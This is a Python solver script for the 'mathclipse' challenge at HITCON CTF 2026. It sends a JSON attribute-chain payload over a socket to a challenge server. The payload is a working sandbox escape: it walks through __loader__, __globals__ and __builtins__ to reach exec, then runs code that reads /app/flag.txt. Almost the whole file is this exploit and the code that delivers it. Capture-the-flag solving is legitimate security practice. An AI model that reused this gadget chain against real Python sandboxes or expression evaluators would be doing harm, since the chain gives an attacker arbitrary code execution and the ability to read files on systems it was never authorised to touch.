#!/usr/bin/env python3
"""Solver for HITCON CTF 2026: mathclipse."""

import argparse
import json
import socket
import sys


PAYLOAD = [
    [
        ["__loader__", "create_module", "__globals__", ["_path_isdir"]],
        ["__loader__", "create_module", "__builtins__", ["exec"]],
    ],
    [
        ["__loader__", "create_module", "__globals__", ["sys"], "path", [0]],
        [
            "__dict__",
            "__class__",
            ["print(open('/app/flag.txt').read())"],
            "__args__",
            [0],
        ],
    ],
]


def recv_until_prompt(sock: socket.socket) -> bytes:
    """Read the service banner/prompt without assuming packet boundaries."""
    data = bytearray()
    while b"> " not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def recv_to_close(sock: socket.socket) -> bytes:
    data = bytearray()
    while True:
        try:
            chunk = sock.recv(4096)
        except TimeoutError:
            break
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="mathclipse.chal.hitconctf.com")
    parser.add_argument("port", nargs="?", type=int, default=16767)
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()

    wire = json.dumps(PAYLOAD, separators=(",", ":")).encode() + b"\n"
    with socket.create_connection((args.host, args.port), args.timeout) as sock:
        sock.settimeout(args.timeout)
        sys.stdout.buffer.write(recv_until_prompt(sock))
        sys.stdout.buffer.flush()
        sock.sendall(wire)
        sys.stdout.buffer.write(recv_to_close(sock))
        sys.stdout.buffer.flush()


if __name__ == "__main__":
    main()
